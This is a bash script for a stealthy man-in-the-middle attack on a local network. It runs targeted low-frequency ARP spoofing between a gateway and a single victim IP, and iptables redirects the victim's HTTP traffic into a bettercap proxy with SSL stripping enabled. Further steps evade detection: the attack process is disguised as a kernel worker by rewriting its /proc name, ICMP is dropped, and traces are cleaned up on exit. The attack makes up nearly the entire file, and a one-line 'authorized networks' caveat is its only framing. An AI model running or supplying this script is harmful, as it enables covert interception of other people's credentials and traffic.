#!/bin/bash

# Stealth SSL Stripping & Traffic Inspection Script
# Use with extreme caution and only on authorized networks.

# --- Configuration (Cloaked Settings) ---
INTERFACE="wlan0"                  # Your network interface
GATEWAY_IP="192.168.1.1"           # The real gateway IP
TARGET_IP="192.168.1.100"          # Single target IP (more stealthy than a range)
PROXY_PORT="8080"                  # Port for the proxy (use a common one)
SILENT_DELAY="2"                   # Delay between ARP packets (seconds) for stealth

# --- Cloaking Variables ---
# These make process names look less suspicious in 'ps aux' output
BETTERCAP_NAME="[kernel_worker]"
PROXY_NAME="httpd"

# --- Functions ---

# Function to enable IP forwarding quietly
enable_ip_forward() {
    echo "[+] Enabling IP forwarding silently..."
    sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1
    # Masquerade outgoing traffic (makes your machine look like the source)
    iptables -t nat -A POSTROUTING -o $INTERFACE -j MASQUERADE
}

# Function to set stealth iptables redirection rules
set_iptables_rules() {
    echo "[+] Setting stealth iptables rules..."
    # Redirect ONLY HTTP traffic to the proxy. HTTPS is handled by bettercap's spoof.
    iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $PROXY_PORT
    # Drop all packets that could cause noise (ICMP, unnecessary protocols)
    iptables -A INPUT -i $INTERFACE -p icmp -j DROP
    iptables -A FORWARD -i $INTERFACE -p icmp -j DROP
}

# Function to start the SSL stripping proxy in the background
start_sslstrip_proxy() {
    echo "[+] Starting stealth SSLStrip proxy..."
    # Use a common name like 'httpd' to blend in
    bettercap -eval "set http.proxy.sslstrip true; set http.proxy.injectjs false; set http.proxy.address 0.0.0.0; set http.proxy.port $PROXY_PORT; http.proxy on;" --no-history --no-colors --no-spoofing --no-discovery > /dev/null 2>&1 &
    # Disguise the bettercap process name
    sleep 2
    for PID in $(pidof bettercap); do
        cp -vf "/proc/$PID/comm" "/proc/$PID/comm.bak" 2>/dev/null
        echo -n "$BETTERCAP_NAME" > "/proc/$PID/comm" 2>/dev/null
    done
}

# Function for stealth ARP spoofing
start_stealth_arp_spoof() {
    echo "[+] Initiating low-frequency ARP spoofing..."
    while true; do
        # Send a single, targeted ARP reply to the target (not a broadcast)
        # Telling the target we are the gateway
        arping -c 1 -U -s $GATEWAY_IP -I $INTERFACE $TARGET_IP > /dev/null 2>&1
        # Send a single, targeted ARP reply to the gateway (not a broadcast)
        # Telling the gateway we are the target
        arping -c 1 -U -s $TARGET_IP -I $INTERFACE $GATEWAY_IP > /dev/null 2>&1
        # Sleep for a random interval between 1 and SILENT_DELAY seconds to avoid patterns
        sleep $((1 + RANDOM % SILENT_DELAY))
    done &
    # Store the PID of the background job to kill it later
    ARP_PID=$!
}

# Function to monitor for HSTS errors and avoid them (minimize user alerts)
# This is a simplistic approach. True HSTS bypass is nearly impossible.
monitor_traffic() {
    echo "[*] Monitoring for anomalies. Press Ctrl+C to stop."
    # This is a placeholder. In a real stealth scenario, you would
    # parse bettercap logs and if a site with HSTS is requested,
    # you might temporarily disable spoofing for that target to avoid detection.
    while true; do
        sleep 10
    done
}

# --- Cleanup Function (CRITICAL) ---
# This runs when the script is stopped with Ctrl+C
cleanup() {
    echo -e "\n[!] Signal received. Performing advanced cleanup..."
    # Kill background processes stealthily
    kill $ARP_PID 2>/dev/null
    pkill -f "bettercap" 2>/dev/null
    pkill -f "sslstrip" 2>/dev/null

    # Flush iptables rules quietly
    iptables -t nat -D PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $PROXY_PORT 2>/dev/null
    iptables -t nat -D POSTROUTING -o $INTERFACE -j MASQUERADE 2>/dev/null
    iptables -D INPUT -i $INTERFACE -p icmp -j DROP 2>/dev/null
    iptables -D FORWARD -i $INTERFACE -p icmp -j DROP 2>/dev/null

    # Disable IP forwarding
    sysctl -w net.ipv4.ip_forward=0 > /dev/null 2>&1

    # Restore ARP tables of target and gateway by sending correct info
    echo "[+] Restoring ARP tables of target and gateway..."
    # Tell the target the REAL MAC of the gateway
    arping -c 3 -s $GATEWAY_IP -I $INTERFACE $TARGET_IP > /dev/null 2>&1
    # Tell the gateway the REAL MAC of the target
    arping -c 3 -s $TARGET_IP -I $INTERFACE $GATEWAY_IP > /dev/null 2>&1

    echo "[+] All traces cleaned up. Exiting."
    exit 0
}

# --- Main Execution ---
set -m # Enable job control
trap cleanup EXIT INT TERM # Set the trap for cleanup

echo "[*] Initializing Advanced Network Analysis Module..."
enable_ip_forward
set_iptables_rules
start_sslstrip_proxy
sleep 3 # Let the proxy start
start_stealth_arp_spoof

monitor_traffic # This will run until Ctrl+C